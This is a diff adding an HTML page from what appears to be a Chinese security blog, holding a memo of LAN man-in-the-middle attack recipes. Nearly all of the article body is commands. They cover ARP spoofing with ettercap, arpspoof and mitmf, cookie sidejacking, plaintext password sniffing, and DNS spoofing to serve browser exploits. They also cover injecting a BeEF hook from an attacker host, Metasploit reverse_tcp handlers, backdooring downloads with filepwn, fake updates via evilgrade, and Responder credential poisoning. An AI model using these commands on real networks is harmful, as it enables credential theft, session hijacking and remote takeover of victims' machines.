@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>内网中间人玩法备忘录</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+
+<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->
+
+
+
+
+
+
+
+<!-- add zoom.js --> 
+<link href="/css/zoom.css" rel="stylesheet">
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/zoom.js"></script>
+<script src="/js/transition.js"></script>
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>
+
+
+    
+    <center style="margin-top:180%">
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">内网中间人玩法备忘录</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">May 16, 2017</span>
+           under web
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          2 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>记录内网中间人的玩法
+</code></pre></div></div>
+
+<h3 id="0x01-欺骗方法">0x01 欺骗方法</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a)ettercap
+    ettercap -Tqi eth0 -M arp /ip// /ip//
+b)arpspoof
+    echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+    arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
+        让受害者以为自己是网关
+    arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
+        让网关以为自己是受害者
+c)mitmf
+    mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
+</code></pre></div></div>
+
+<h3 id="0x02-利用原理">0x02 利用原理</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
+</code></pre></div></div>
+
+<h3 id="0x03-不同组合">0x03 不同组合</h3>
+
+<h4 id="0xa-ettercapferrethamster">0xa ettercap+ferret+hamster</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:监听cookie达到会话劫持的目的
+
+1.ettercap:让数据经过本机网卡
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+    欺骗路由器192.168.1.1和其他机器的通话
+    ettercap -Tqi eth0 -M arp /// ///
+        欺骗任意两台机器之间的通话
+    ettercap -Tqi eth0 -M arp /192.168.1.101// /192.168.1.1//
+        欺骗192.168.1.101和路由器192.168.1.101之间的通话
+
+2.ferret:取cookie
+ferret -i eth0
+    kali(x64)没有ferret,需要如下命令安装:
+    dpkg --add-architecture i386 &amp;&amp; apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y &amp;&amp; aptitude install ferret-sidejack:i386
+
+3.hamster:利用cookie
+hamster
+    需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
+</code></pre></div></div>
+
+<h4 id="0xb-cain">0xb cain</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取密码
+</code></pre></div></div>
+
+<h4 id="0xc-arpspoofdsniff">0xc arpspoof+dsniff</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取明文密码
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1   欺骗192.168.1.101
+    [arpspoof -i eth0 192.168.1.1    欺骗所有机器]
+dsniff(new terminal)
+
+类似于cain的效果,但是测试不能截到http表单中的密码
+</code></pre></div></div>
+
+<h4 id="0xd-ettercapdriftnet">0xd ettercap+driftnet</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取图片
+
+ettercap -Tqi eth0 -M arp /192.168.1.1// ///
+driftnet -i eth0 -a -d /tmp/output/
+    或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
+</code></pre></div></div>
+
+<h4 id="0xe-ettercapiefirefoxchromesafari漏洞">0xe ettercap+ie(firefox,chrome,safari)漏洞</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
+
+vim /etc/ettercap/etter.conf
+    编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
+        https://www.youtube.com/watch?v=tW_NMG2IZ5s
+
+vim /etc/ettercap/etter.dns
+    添加* A 192.168.1.101在开始设置解析的地方
+
+ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    ettercap -P list可查看支持的插件
+    这里用的是dns欺骗插件
+
+msf设置利用ie漏洞或其他浏览器的漏洞
+    
+</code></pre></div></div>
+
+<h4 id="0xf-mitmfbeef">0xf mitmf+beef</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:控制浏览器
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --hsts --inject --js-url http://192.168.1.104:3000/hook.js
+</code></pre></div></div>
+
+<h4 id="0xg-mitmfmsf">0xg mitmf+msf</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
+
+msfconsole
+use multi/hanlder
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.0.106
+set lport 4444
+exploit
+
+msfconsole(another terminal)
+load msgrpc Pass=abc123
+如果到这里报错无法连接msfrpc则根据需要修改/etc/mitmf/mitmf.conf中的与msfrpc相关的设置(端口或密码)
+
+vi /etc/mitmf/mitmf.conf
+    eg.相关设置如下
+            [[[[WindowsIntelx86]]]]
+			PATCH_TYPE = APPEND #JUMP/SINGLE/APPEND
+			# PATCH_METHOD overwrites PATCH_TYPE, use automatic, replace, or onionduke
+			PATCH_METHOD = automatic
+			HOST = 192.168.0.106
+			PORT = 4444
+			# SHELL for use with automatic PATCH_METHOD
+			SHELL = iat_reverse_tcp_inline_threaded
+			# SUPPLIED_SHELLCODE for use with a user_supplied_shellcode payload
+			SUPPLIED_SHELLCODE = None
+			ZERO_CERT = True
+			# PATCH_DLLs as they come across
+			PATCH_DLL = False
+			# RUNAS_ADMIN will attempt to patch requestedExecutionLevel as highestAvailable
+			RUNAS_ADMIN = False
+			# XP_MODE  - to support XP targets
+			XP_MODE = True
+			# SUPPLIED_BINARY is for use with PATCH_METHOD 'onionduke' DLL/EXE can be x64 and
+			#  with PATCH_METHOD 'replace' use an EXE not DLL
+			SUPPLIED_BINARY = veil_go_payload.exe
+			MSFPAYLOAD = windows/meterpreter/reverse_tcp
+
+mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1 --filepwn(欺骗192.168.1.101)
+    mitmf -i eth0 --spoof --arp --gateway 192.168.1.1 --filepwn(欺骗c段)
+    如果报错则要根据官网最接安装方法重新安装
+    https://github.com/byt3bl33d3r/MITMf/wiki/Installation
+</code></pre></div></div>
+
+<h4 id="0xh-evilgrade">0xh evilgrade</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取shell
+
+1.kali下没有安装evilgrade需要:
+apt-get install isr-evilgrade,如果没成功则用最新版kali安装即可
+evilgrade
+show modules
+conf notepadplus
+show options
+set agent '["%out...."]'//这里参考youtube视频,设置agent为生成的shell的存放路径
+start
+
+2.ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
+    设置notepadplus的更新地址[上面evilgrade中的show options中的vhost的域名]的A记录解析到攻击者所在机器
+
+3.msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 4444
+set lhost xxx.xxx.xxx.xxx
+exploit
+</code></pre></div></div>
+
+<h4 id="0xi-responder">0xi responder</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>作用:获取系统登录明文密码
+
+./Responder.py -I eth0 -wrf
+
+detail:
+responder是一个LLMNR, NBT-NS and MDNS poisoner,可参考如下link：
+https://github.com/SpiderLabs/Responder
+https://mp.weixin.qq.com/s/ij4olS8GrYr7L-4LFGpQxg
+</code></pre></div></div>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            中间人, 内网
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<!--
+<script src="/js/bootstrap.min.js"></script>
+-->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<!--
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+-->
+
+
+    </body>
+</html>
